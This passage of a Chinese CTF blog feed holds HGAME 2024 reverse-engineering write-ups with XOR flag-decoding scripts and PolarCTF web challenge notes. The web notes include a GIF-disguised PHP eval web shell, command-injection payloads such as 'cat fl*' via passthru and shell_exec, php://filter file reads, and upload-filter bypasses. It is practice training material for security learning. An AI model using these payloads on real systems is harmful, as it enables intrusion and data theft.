vol.py</span><br><span class="line"></span><br><span class="line">┌──(root㉿bohemian)-[/tools/volatility]</span><br><span class="line">└─<span class="comment"># file file.None.0xfffffa80075fc010.dat</span></span><br><span class="line">file.None.0xfffffa80075fc010.dat: Microsoft Word 2007+</span><br><span class="line"></span><br><span class="line">┌──(root㉿bohemian)-[/tools/volatility]</span><br><span class="line">└─<span class="comment"># file file.None.0xfffffa8007eaba90.vacb</span></span><br><span class="line">file.None.0xfffffa8007eaba90.vacb: Microsoft Word 2007+</span><br><span class="line"></span><br><span class="line">┌──(root㉿bohemian)-[/tools/volatility]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">改docx 即可</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-2024-WEEK-1-部分wp</title>
      <link href="/2024/01/30/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/"/>
      <url>/2024/01/30/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/image-20240130100622281.png" alt="image-20240130100622281"></p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><h5 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a><strong>ezIDA</strong></h5><p>下载程序直接，记事本右键打开就可以了，</p><h5 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a><strong>ezASM</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    c db 74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34</span><br><span class="line">    flag db 33 dup(0)</span><br><span class="line">    format db &quot;plz input your flag: &quot;, 0</span><br><span class="line">    success db &quot;Congratulations!&quot;, 0</span><br><span class="line">    failure db &quot;Sry, plz try again&quot;, 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; Print prompt</span><br><span class="line">    mov eax, 4</span><br><span class="line">    mov ebx, 1</span><br><span class="line">    mov ecx, format</span><br><span class="line">    mov edx, 20</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    ; Read user input</span><br><span class="line">    mov eax, 3</span><br><span class="line">    mov ebx, 0</span><br><span class="line">    mov ecx, flag</span><br><span class="line">    mov edx, 33</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    ; Check flag</span><br><span class="line">    xor esi, esi</span><br><span class="line">check_flag:</span><br><span class="line">    mov al, byte [flag + esi]</span><br><span class="line">    xor al, 0x22</span><br><span class="line">    cmp al, byte [c + esi]</span><br><span class="line">    jne failure_check</span><br><span class="line"></span><br><span class="line">    inc esi</span><br><span class="line">    cmp esi, 33</span><br><span class="line">    jne check_flag</span><br><span class="line"></span><br><span class="line">    ; Print success message</span><br><span class="line">    mov eax, 4</span><br><span class="line">    mov ebx, 1</span><br><span class="line">    mov ecx, success</span><br><span class="line">    mov edx, 14</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    ; Exit</span><br><span class="line">    mov eax, 1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">failure_check:</span><br><span class="line">    ; Print failure message</span><br><span class="line">    mov eax, 4</span><br><span class="line">    mov ebx, 1</span><br><span class="line">    mov ecx, failure</span><br><span class="line">    mov edx, 18</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    ; Exit</span><br><span class="line">    mov eax, 1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>什么？汇编看不懂？，直接交给chatgpt</p><p><img src="/images/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/image-20240130100835357.png" alt="image-20240130100835357"></p><p>gpt给出了异或了0x22 那么就简单了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34&quot;</span></span><br><span class="line">a = a.split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)^<span class="number">0x22</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;</span></span><br></pre></td></tr></table></figure><h5 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a><strong>ezUPX</strong></h5><p>upx的壳，需要upx解下壳<br><img src="/images/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/image-20240130104400304.png" alt="image-20240130104400304"></p><p>.\upx.exe -d .\ezUPX.exe</p><p><img src="/images/HGAME-2024-WEEK-1-%E9%83%A8%E5%88%86wp/image-20240130104421860.png" alt="image-20240130104421860"></p><p>这里进行了亦或操作，等于word_1400022A0<br>拉一下word_1400022A0的值，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">word_1400022A0=[</span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x49</span>, <span class="number">0x65</span>, <span class="number">0x5D</span>, <span class="number">0x45</span>, <span class="number">0x13</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x02</span>, <span class="number">0x47</span>, <span class="number">0x6D</span>, <span class="number">0x59</span>, <span class="number">0x5C</span>, <span class="number">0x02</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0x5E</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x5E</span>, <span class="number">0x01</span>, <span class="number">0x6D</span>, <span class="number">0x02</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0x67</span>, <span class="number">0x62</span>, <span class="number">0x6A</span>, <span class="number">0x13</span>, <span class="number">0x4F</span>, <span class="number">0x32</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(word_1400022A0))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(word_1400022A0)):</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>((word_1400022A0[i]^<span class="number">0x32</span>))),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a><strong>ezPYC</strong></h5><p>听说附件给错了，更新了后，又做一下<br>直接工具解出来pyc，在线的工具，pyc解成py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">87</span>,</span><br><span class="line">    <span class="number">75</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">117</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">55</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">51</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">91</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">119</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">49</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">124</span>,</span><br><span class="line">    <span class="number">2</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>]</span><br><span class="line"><span class="keyword">for</span> i ,char <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(char^c[i % <span class="number">4</span>]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>还原一下即可。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>polarctfweb刷题记录2</title>
      <link href="/2024/01/16/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
      <url>/2024/01/16/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h5><p>文件上传，随便穿一个东西发现需要传gif，改一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">GIF89A&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>即可</p><h5 id="自由的文件上传系统"><a href="#自由的文件上传系统" class="headerlink" title="自由的文件上传系统"></a>自由的文件上传系统</h5><p>文件上传+文件包含<br>随意传个文件，包含一下即可</p><h5 id="代码审计1"><a href="#代码审计1" class="headerlink" title="代码审计1"></a>代码审计1</h5><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$sys</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;|flag|&quot;</span>, <span class="variable">$xsx</span>)) &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;flag is no here!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$xsx</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xsx&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$sys</span>(<span class="variable">$xsx</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们看到new $a($b)格式的字样。说明这是一道php原生类利用的题目。</p><p>这道题是文件读取类：SplFileObject。<br>‘SplFileObject中的<code>toString0（）魔术方法只有在尝试将对象转换为字符串时才会被自动调用 通常，这是在使用</code>echo<code>或</code>print<code>函数时发生的，或者在将对象与字符串连接时发生。但是， SplFileObject不是一个直接支持</code>__toString()`的类。<br>SplFileObject类，只能读取文件的第一行内容，如果想要全部读取就需要用到foreach函数，但若<br>中没有给出foreach函数的话，就要用伪协议读取文件的内容。<br>例如：？a=SplFileObject&amp;b=php:/filter/read=convert.base64-encode/resource=flag</p><p><code>http://46fd8555-f05c-43c4-bffa-6124175427dd.www.polarctf.com:8090/ ?sys=SplFileObject&amp;xsx=php://filter/convert.base64-encode/resource=flag.php</code></p><p><img src="/images/polarctf/image-20240116204301861.png" alt="image-20240116204301861"></p><h5 id="干正则"><a href="#干正则" class="headerlink" title="干正则"></a>干正则</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    @parse_str(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] == <span class="string">&#x27;www.polarctf.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag\.php/&#x27;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;don&#x27;t show flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> .= shell_exec(<span class="string">&#x27;ping -c 2 &#x27;</span> . <span class="variable">$a</span>[<span class="number">0</span>] . <span class="variable">$ip</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;其实很简单！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给了源码，要传参id，id经过parse_str处理</p><p>parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 </p><p>语法：parse_str(string,array)</p><p>也就是说，如果没有array,那么我们传<code>a[0]=www.polarctf.com</code>，那么也就会a[0]是个变量了，这样就符合条件了，<br>cmd传参就简单了，这里把a[0]的给拼接了，这里直接用|就可以了，这样|后面的命令就可以执行了<br><code>http://e9c19481-2e55-4e77-9d73-5bf35f99eaeb.www.polarctf.com:8090/?id=a[0]=www.polarctf.com&amp;cmd=asd;cat fl*</code><br>查看源码即可。</p><h5 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h5><p>robots有个file文件，任意文件读取，<a href="http://10eb2514-4c9d-4aaa-bfbb-81c87b1b7667.www.polarctf.com:8090/file/file.php?filename=php://filter/convert.base64-encode/resource=../uploads/upload.php">http://10eb2514-4c9d-4aaa-bfbb-81c87b1b7667.www.polarctf.com:8090/file/file.php?filename=php://filter/convert.base64-encode/resource=../uploads/upload.php</a><br>lfi读一下upload，白名单。那么配合文件包含直接图片马即可<br><a href="http://10eb2514-4c9d-4aaa-bfbb-81c87b1b7667.www.polarctf.com:8090/file/file.php?filename=../uploads/images/asdasd.png">http://10eb2514-4c9d-4aaa-bfbb-81c87b1b7667.www.polarctf.com:8090/file/file.php?filename=../uploads/images/asdasd.png</a><br><img src="/images/polarctf/image-20240117211315535.png" alt="image-20240117211315535"></p><h5 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.rand(<span class="number">10000</span>,<span class="number">99999</span>).<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>右键源代码给了源码，替换列表中后缀，双写绕过即可，asdasd.pphphp</p><h5 id="cool"><a href="#cool" class="headerlink" title="cool"></a>cool</h5><p><code>http://0652266e-ee52-43a0-b00b-d0a54e66a193.www.polarctf.com:8090/?a=passthru(&#39;cat fla*&#39;);</code></p><h5 id="phpurl"><a href="#phpurl" class="headerlink" title="phpurl"></a>phpurl</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;xxs&quot;</span>===<span class="variable">$_GET</span>[sys]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Not a good idea!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[sys] = urldecode(<span class="variable">$_GET</span>[sys]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[sys] == <span class="string">&quot;xxs&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to polar LABS!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Flag: XXXXXXX &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/polarctf/image-20240117210721767.png" alt="image-20240117210721767"></p><p><code>http://809e69b5-b363-456e-a92e-7f6388b058ca.www.polarctf.com:8090/index.php?sys=%25%37%38%25%37%38%25%37%33</code><br>默认传参的时候传递的值会解码一次，而题目又解码了一次，所以将xxs编码两次</p><p><img src="/images/polarctf/image-20240118084615748.png" alt="image-20240118084615748"></p><h5 id="你的马呢？"><a href="#你的马呢？" class="headerlink" title="你的马呢？"></a>你的马呢？</h5><p>图片马+文件包含</p><h5 id="随机值"><a href="#随机值" class="headerlink" title="随机值"></a>随机值</h5><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Polar2</span> = rand(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;Polar1 === <span class="keyword">$this</span>-&gt;Polar2)&#123;</span><br><span class="line">            <span class="variable">$Light</span> = rand(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;Night === <span class="keyword">$this</span>-&gt;Light)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your wrong!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;getflag(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 